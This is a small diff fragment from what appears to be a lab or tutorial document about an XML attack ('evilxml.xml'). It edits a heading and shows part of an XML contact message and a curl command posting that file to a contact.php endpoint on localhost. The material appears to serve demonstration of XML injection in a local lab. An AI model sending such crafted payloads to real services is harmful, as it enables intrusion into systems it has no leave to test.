@@ -43,6 +43,6 @@ evilxml.xml
     <message>I LOVE WATCHING YOUR SKILLS, MAN</message>
     </contact>
 
-Attack
+Attack :
 
     curl -d @evilxml.xml localhost:10004/contact.php ; echo
